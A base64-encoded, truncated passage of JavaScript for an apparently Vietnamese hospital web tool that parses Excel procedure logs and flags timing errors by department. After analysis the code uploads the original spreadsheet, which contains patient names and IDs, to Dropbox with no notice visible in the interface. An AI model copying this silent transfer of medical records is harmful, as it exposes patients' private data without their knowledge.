mdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICB9DQoNCi8vID09PT09PT09PT0gSMOATSBMT0FEIERBTkggU8OBQ0ggS0hPQSBI4buiUCBM4buGID09PT09PT09PT0gLy8NCmFzeW5jIGZ1bmN0aW9uIGxvYWRWYWxpZERlcGFydG1lbnRzKCkgew0KICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4va2hvYS50eHQnOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBraG9hTGlzdCA9IHRleHQuc3BsaXQoJ1xuJykubWFwKGxpbmUgPT4gbGluZS50cmltKCkudG9Mb3dlckNhc2UoKSkuZmlsdGVyKEJvb2xlYW4pOw0KICAgICAgICByZXR1cm4ga2hvYUxpc3Q7DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoIktow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIGtob2E6IiwgZXJyKTsNCiAgICAgICAgcmV0dXJuIFtdOw0KICAgIH0NCn0NCg0KICAgICAgICAvLyA9PT09PT09PT09IFBI4bqmTiBY4busIEzDnSBGSUxFID09PT09PT09PT0gLy8NCmZ1bmN0aW9uIGhhbmRsZUZpbGUoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGNvbnN0IGZpbGUgPSBmaWxlSW5wdXQuZmlsZXNbMF07DQoJDQppZiAoIWZpbGUpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+VnVpIGzDsm5nIGNo4buNbiBmaWxlIHRyxrDhu5tjIGtoaSBraeG7g20gdHJhPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5PSdub25lJyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcmV0dXJuOw0KfQ0KDQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5hZGQoJ2hpZGRlbicpOw0KICAgIGVycm9yTG9nID0gW107DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIGtp4buDbSB0cmEuLi4nOw0KICAgIC8vIOKchSBC4bqvdCDEkeG6p3UgxJHhur9tIDJzIMSR4buDIGhp4buHbiBwb3B1cCBu4bq/dSB24bqrbiDEkWFuZyAixJBhbmcga2nhu4NtIHRyYS4uLiINCmNsZWFyVGltZW91dChhbmFseXplUG9wdXBUaW1lcik7DQphbmFseXplUG9wdXBUaW1lciA9IHNldFRpbWVvdXQoKCkgPT4gew0KICAgIGNvbnN0IGJ0bkFuYWx5emUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChidG5BbmFseXplLmlubmVySFRNTC5pbmNsdWRlcygnxJBhbmcga2nhu4NtIHRyYScpKSB7DQogICAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgICAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtc2F0ZWxsaXRlLWRpc2ggaWNvbi1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgICAgIDxzdHJvbmc+xJDGsOG7nW5nIHRydXnhu4FuIGdpw6FuIMSRb+G6oW48L3N0cm9uZz48YnIvPg0KICAgICAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgICAgYDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgICAgICAvLyBDaOG6oXkgcHJvZ3Jlc3NCYXIgJQ0KICAgICAgICBsZXQgcGVyY2VudCA9IDA7DQogICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KICAgICAgICBjb25zdCBwcm9ncmVzc1RpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgICAgICAgICAgcGVyY2VudCArPSAyOw0KICAgICAgICAgICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgICAgICAgICBwZXJjZW50ID0gMTAwOw0KICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwocHJvZ3Jlc3NUaW1lcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IHBlcmNlbnQgKyAnJSc7DQogICAgICAgIH0sIDEwMCk7DQogICAgfQ0KfSwgNTAwMCk7DQoNCiAgICBjb25zdCByZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOw0KICAgIA0KICAgIHJlYWRlci5vbmxvYWQgPSBhc3luYyBmdW5jdGlvbihlKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCBkYXRhID0gbmV3IFVpbnQ4QXJyYXkoZS50YXJnZXQucmVzdWx0KTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHdvcmtib29rLlNoZWV0TmFtZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIEV4Y2VsIGtow7RuZyBjw7Mgc2hlZXQgbsOgbycpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oZmlyc3RTaGVldCwgeyANCiAgICAgICAgICAgICAgICBoZWFkZXI6IDEsIA0KICAgICAgICAgICAgICAgIGRlZnZhbDogIiIsIA0KICAgICAgICAgICAgICAgIGJsYW5rcm93czogdHJ1ZSANCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgY29uc3QgZG9uZzUgPSAoanNvbkRhdGFbNF0gJiYganNvbkRhdGFbNF1bMF0pID8ganNvbkRhdGFbNF1bMF0udG9TdHJpbmcoKS50cmltKCkgOiAiS2jDtG5nIHLDtSI7DQpjb25zdCBkb25nNiA9IChqc29uRGF0YVs1XSAmJiBqc29uRGF0YVs1XVswXSkgPyBqc29uRGF0YVs1XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCndpbmRvdy5uZ2F5VmFsdWUgPSBkb25nNTsgIC8vIOKshSBkw7JuZyA1ID0gTmfDoHkNCndpbmRvdy5raG9hVmFsdWUgPSBkb25nNjsgIC8vIOKshSBkw7JuZyA2ID0gS2hvYQ0KDQoNCgkJCS8vLy8gS2nhu4NtIHRyYSBraG9hIC8vLy8vDQovLyDinIUgTOG6pXkgZOG7ryBsaeG7h3UgZMOybmcgNiwgY+G7mXQgQQ0KY29uc3Qga2hvYVJvdyA9IGpzb25EYXRhWzVdOyAvLyBkw7JuZyA2DQpjb25zdCBraG9hVGV4dCA9IChraG9hUm93ICYmIGtob2FSb3dbMF0gfHwgIiIpLnRvU3RyaW5nKCkudHJpbSgpOw0KY29uc3Qga2hvYUxvd2VyID0ga2hvYVRleHQudG9Mb3dlckNhc2UoKTsNCg0KLy8g4pyFIEtp4buDbSB0cmEgdMOqbiBraG9hDQpjb25zdCB2YWxpZEtob2FMaXN0ID0gYXdhaXQgbG9hZFZhbGlkRGVwYXJ0bWVudHMoKTsNCmlmICghdmFsaWRLaG9hTGlzdC5zb21lKGtob2EgPT4ga2hvYUxvd2VyLmluY2x1ZGVzKGtob2EpKSkgew0KICAgICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQogICAgY29uc3QgbXNnID0gYOKdjCBNw6F5IGNo4bunIHThu6sgY2jhu5FpICR7a2hvYVRleHQgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnfSBz4butIGThu6VuZyBwaOG6p24gbeG7gW0uIDxici8+VnVpIGzDsm5nIG11YSBi4bqjbiBxdXnhu4FuIMSR4buDIHTDtG4gdHLhu41uZyB0w6FjIGdp4bqjLiBgOw0KDQogICAgLy8gSGnhu4NuIHBvcHVwIGNo4bupIGtow7RuZyBhbGVydA0KIC8vIEhp4buDbiB0aOG7iyBwb3B1cA0KICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIHRow7RuZyBiw6FvIGzhu5dpIHbEqW5oIHZp4buFbg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1iYW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7Zm9udC1zaXplOjIwcHg7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+JHttc2d9PC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKSI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQoNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCg0KICAgIC8vIOKchSBWw5QgSEnhu4ZVIEjDk0EgYuG6pXQga+G7syDEkW/huqFuIG7DoG8gY+G7kSBn4bqvbmcg4bqpbiBwb3B1cCBzYXUgxJHDsw0KICAgIHdpbmRvdy5pc0tob2FMb2kgPSB0cnVlOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKS5pbm5lckhUTUwgPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDtmb250LXdlaWdodDpib2xkIj4ke21zZ308L3NwYW4+YDsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgcmV0dXJuOw0KfQ0KDQoNCg0KCQkJDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoIDw9IDEpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBk4buvIGxp4buHdSAoY2jhu4kgY8OzIHRpw6p1IMSR4buBIGhv4bq3YyB0cuG7kW5nKScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgIHByb2Nlc3NEYXRhKGpzb25EYXRhKTsNCiAgICAgICAgICBjb25zdCBzdGF0cyA9IHsNCiAgICAgICAgICAgIGhlcmI6IGdldEhlcmJPdXRsaWVyVG90YWwoKSwNCiAgICAgICAgICAgICAgdGltZTogZ2V0VGltZUVycm9yVG90YWwoKSwNCiAgICAgICAgICAgICBjb25mbGljdDogZ2V0Q29uZmxpY3RUb3RhbCgpDQogICAgICAgICAgfTsNCiAgICAgICAgICBjb25zdCB1cGxvYWRGaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KIGF3YWl0IHVwbG9hZFRvRHJvcGJveCh1cGxvYWRGaWxlLCB3aW5kb3cua2hvYVZhbHVlLCB3aW5kb3cubmdheVZhbHVlLCBzdGF0cyk7DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5yZW1vdmUoJ2hpZGRlbicpOw0KICAgICAgICAgICAgbG9nRXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZSBFeGNlbCcsIG51bGwsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgYWxlcnQoJ0PDsyBs4buXaSB44bqjeSByYSBraGkgxJHhu41jIGZpbGU6ICcgKyBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgfSBmaW5hbGx5IHsNCgkJY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsgLy8g4pyFIE5n4bqvdCB0aW1lciBwb3B1cA0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOyAvLyDinIUg4bqobiBwb3B1cA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyAgIC8vIOKchSDhuqhuIGjhurNuIHBvcHVwDQogICAgICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgICAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNlYXJjaCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gS2nhu4NtIFRyYSc7DQogICAgICAgIH0NCiAgICB9Ow0KICAgIA0KICAgIHJlYWRlci5vbmVycm9yID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7DQogICAgICAgIGxvZ0Vycm9yKCdM4buXaSBraGkgxJHhu41jIGZpbGUnLCBudWxsLCAnS2jDtG5nIHRo4buDIMSR4buNYyBu4buZaSBkdW5nIGZpbGUnKTsNCiAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc2VhcmNoIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBLaeG7g20gVHJhJzsNCiAgICAgICAgYWxlcnQoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZS4gVnVpIGzDsm5nIHRo4butIGzhuqFpIHbhu5tpIGZpbGUga2jDoWMuJyk7DQogICAgfTsNCiAgICANCiAgICByZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoZmlsZSk7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gcHJvY2Vzc0RhdGEoZGF0YSkgew0KICAgIA0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IGhlYWRlckxpbmUxID0gZGF0YVs3XSB8fCBbXTsNCiAgICAgICAgY29uc3QgaGVhZGVyTGluZTIgPSBkYXRhWzhdIHx8IFtdOw0KICAgICAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICAgICAgKTsNCg0KICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KCQkJCWNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbiIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG1pc3NpbmdDb2x1bW5zID0gW107DQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZUluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCcpOw0KICAgICAgICAgICAgICAgIGlmIChzdGFydEluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24nKTsNCiAgICAgICAgICAgICAgICBpZiAoZW5kSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YycpOw0KICAgICAgICAgICAgICAgIGlmIChvcGVyYXRvckluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCBjaMOtbmgnKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobWlzc2luZ0NvbHVtbnMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEtow7RuZyB0w6xtIHRo4bqleSBjw6FjIGPhu5l0IGLhuq90IGJ14buZYzogJHttaXNzaW5nQ29sdW1ucy5qb2luKCcsICcpfWApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCByb3dzID0gZGF0YS5zbGljZSg5KTsNCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gW107DQogICAgICAgICAgICAgICAgY29uc3QgaGVyYlByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBsZXQgc2tpcHBlZFJvd3MgPSAwOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICAgICAgICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignRMOybmcgdHLhu5FuZycsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoYFRo4bunIHRodeG6rXQga2jDtG5nIG7hurFtIHRyb25nIGRhbmggc8OhY2gga2nhu4NtIHRyYTogJHtwcm9jZWR1cmVOYW1lfWAsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLnNraXApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdGFydCB8fCAhZW5kKSB7DQogICANCiAgICBza2lwcGVkUm93cysrOw0KICA